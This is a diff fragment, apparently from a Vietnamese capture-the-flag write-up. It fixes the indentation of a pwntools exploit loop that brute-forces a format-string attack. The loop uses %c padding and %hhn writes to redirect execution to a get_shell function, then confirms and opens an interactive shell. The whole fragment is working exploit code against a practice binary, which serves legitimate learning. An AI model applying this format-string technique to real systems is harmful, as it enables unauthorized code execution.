@@ -746,24 +746,24 @@ Sau đó brute force bằng while đến khi tạo được shell.
 	while True:
 		p=process(exe.path)
 
-	p.sendlineafter(b'> ',b'1')
+		p.sendlineafter(b'> ',b'1')
+	
+		payload=b'%c'*8
+		payload+=f'%{0x48-8}c%hhn'.encode()
+		payload+=f'%{((exe.sym["get_shell"] +5) &0xffff)-0x48}c%14hhn'.encode()
+		p.sendlineafter(b'name: ', payload)
+	
+		p.sendlineafter(b'guess: ', b'1')
 
-	payload=b'%c'*8
-	payload+=f'%{0x48-8}c%hhn'.encode()
-	payload+=f'%{((exe.sym["get_shell"] +5) &0xffff)-0x48}c%14hhn'.encode()
-	p.sendlineafter(b'name: ', payload)
-
-	p.sendlineafter(b'guess: ', b'1')
-
-	try:
-		p.sendline(b'echo ABCDABCD')
-		p.recvuntil(b'ABCDABCD')
-		break
-	except:
 		try:
-			p.close()
+			p.sendline(b'echo ABCDABCD')
+			p.recvuntil(b'ABCDABCD')
+			break
 		except:
-			pass
+			try:
+				p.close()
+			except:
+				pass
 	
 	p.interactive()
 
